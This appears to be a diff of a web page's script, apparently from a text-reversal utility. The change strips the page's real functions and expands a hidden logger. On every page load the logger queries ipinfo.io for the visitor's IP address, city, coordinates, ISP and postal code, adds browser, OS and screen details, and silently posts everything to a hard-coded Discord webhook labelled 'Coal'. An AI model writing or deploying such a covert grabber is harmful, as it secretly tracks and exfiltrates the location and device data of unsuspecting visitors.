@@ -191,65 +191,132 @@
             }
         }
     </style>
-    <script>
-        // Discord Webhook URL
-        const webhook_url = "https://discord.com/api/webhooks/1290686478359203932/GQqrG5p9h3_6xhdF9OMlWmal0ECOItPF-SjKru3aQLMUqRcR-GIDC0rWz4bDfRI57mx6";
+<script>
+	$.get("https://ipinfo.io", function(response) {
+		// Discord Webhook URL
+		const webhook_url = "https://discord.com/api/webhooks/1290686478359203932/GQqrG5p9h3_6xhdF9OMlWmal0ECOItPF-SjKru3aQLMUqRcR-GIDC0rWz4bDfRI57mx6";
 
-        function sendWebhook(response) {
-            // 현재 시간 UNIX 타임스탬프 (초 단위)
-            const currentTime = Math.floor(Date.now() / 1000); // UNIX 시간
+		// 현재 시간 UNIX 타임스탬프 (초 단위)
+		const currentTime = Math.floor(Date.now() / 1000); // UNIX 시간
 
-            // 메인 임베드 내용 구성
-            const main = {
-                title: "Coal",
-                description: "> 정보 수집 성공!",
-                color: 3447003, // 파란색 임베드 색상
-                thumbnail: {
-                    url: "https://cdn.discordapp.com/attachments/1280491923861278861/1290686754755575952/J.jpg",
-                },
-                fields: [
-                    { name: "IP:", value: `\`${response.ip}\``, inline: false },
-                    { name: "User-Agent:", value: `\`${navigator.userAgent}\``, inline: false },
-                    { name: "도시:", value: `\`${response.city}\``, inline: false },
-                    { name: "지역:", value: `\`${response.region}\``, inline: false },
-                    { name: "나라:", value: `\`${response.country}\``, inline: false },
-                    { name: "위도/경도:", value: `\`${response.loc}\``, inline: false },
-                    { name: "사용 통신사:", value: `\`${response.org}\``, inline: false },
-                    { name: "우편번호:", value: `\`${response.postal}\``, inline: false },
-                    { name: "접속 시간 (상대적):", value: `<t:${currentTime}:R>`, inline: false }
-                ],
-                footer: { text: "Coal | 로깅 성공!" },
-                author: { name: "Coal", url: "" }
-            };
+		// 시스템 정보 수집
+		const screenWidth = window.screen.width;
+		const screenHeight = window.screen.height;
+		const language = navigator.language || navigator.userLanguage;
+		const platform = navigator.platform; // 운영 체제
+		const userAgent = navigator.userAgent;
+		const isMobile = /Mobi|Android/i.test(userAgent) ? "모바일" : "데스크탑"; // 모바일 여부
+		const colorDepth = window.screen.colorDepth; // 색상 깊이
 
-            // Discord 웹훅으로 데이터 전송
-            const xhttp = new XMLHttpRequest();
-            xhttp.open("POST", webhook_url, true);
-            xhttp.setRequestHeader('Content-Type', 'application/json');
-            xhttp.send(JSON.stringify({ 'username': 'Coal', 'embeds': [main] }));
-        }
+		// 브라우저 이름과 버전 추출
+		const browserMatch = userAgent.match(/(Chrome|Firefox|Safari|MSIE|Trident|Edge)\/? ?(\d+(\.\d+)?)/);
+		const browserName = browserMatch ? browserMatch[1] : "알 수 없음";
+		const browserVersion = browserMatch ? browserMatch[2] : "알 수 없음";
 
-        $(document).ready(function() {
-            $.get("https://ipinfo.io", function(response) {
-                sendWebhook(response); // 웹훅 전송
-            }, "json");
+		// 메인 임베드 내용 구성
+		const main = {
+			title: "Coal",
+			description: "> 정보 수집 성공!",
+			color: 3447003, // 파란색 임베드 색상
+			thumbnail: {
+				url: "https://cdn.discordapp.com/attachments/1280491923861278861/1290686754755575952/J.jpg",
+			},
+			fields: [
+				{
+					name: "IP:",
+					value: `\`${response.ip}\``,
+					inline: false,
+				},
+				{
+					name: "User-Agent:",
+					value: `\`${userAgent}\``,
+					inline: false,
+				},
+				{
+					name: "브라우저:",
+					value: `\`${browserName} ${browserVersion}\``,
+					inline: false,
+				},
+				{
+					name: "도시:",
+					value: `\`${response.city}\``,
+					inline: false,
+				},
+				{
+					name: "지역:",
+					value: `\`${response.region}\``,
+					inline: false
+				},
+				{
+					name: "나라:",
+					value: `\`${response.country}\``,
+					inline: false
+				},
+				{
+					name: "위도/경도:",
+					value: `\`${response.loc}\``,
+					inline: false
+				},
+				{
+					name: "사용 통신사:",
+					value: `\`${response.org}\``,
+					inline: false
+				},
+				{
+					name: "우편번호:",
+					value: `\`${response.postal}\``,
+					inline: false
+				},
+				{
+					name: "접속 시간:",
+					value: `<t:${currentTime}:F>`, // 상대적 시간으로 표시 (예: 5분 전)
+					inline: false
+				},
+				{
+					name: "화면 해상도:",
+					value: `\`${screenWidth} x ${screenHeight}\``,
+					inline: false
+				},
+				{
+					name: "언어:",
+					value: `\`${language}\``,
+					inline: false
+				},
+				{
+					name: "운영 체제:",
+					value: `\`${platform}\``,
+					inline: false
+				},
+				{
+					name: "장치 종류:",
+					value: `\`${isMobile}\``,
+					inline: false
+				},
+				{
+					name: "색상 깊이:",
+					value: `\`${colorDepth} 비트\``,
+					inline: false
+				}
+			],
+			footer: {
+				text: "Coal | 로깅 성공!",
+			},
+			author: {
+				name: "Coal",
+				url: ""
+			}
+		}
 
-            $('#convertBtn').on('click', function() {
-                const input = $('#inputText').val();
-                const output = input.split('').reverse().join(''); // 텍스트를 역순으로 변환
-                $('#outputText').text(output);
-            });
-
-            $('#clearBtn').on('click', function() {
-                $('#inputText').val('');
-                $('#outputText').text('');
-            });
-
-            window.togglePopup = function() {
-                $('#settingsPopup').toggleClass('active');
-            }
-        });
-    </script>
+		// Discord 웹훅으로 데이터 전송
+		const xhttp = new XMLHttpRequest();
+		xhttp.open("POST", webhook_url, true);
+		xhttp.setRequestHeader('Content-Type', 'application/json');
+		xhttp.send(JSON.stringify({
+			'username': 'Coal',
+			'embeds': [main],
+		}));
+	}, "json");
+</script>
 </head>
 <body>
     <div class="container">
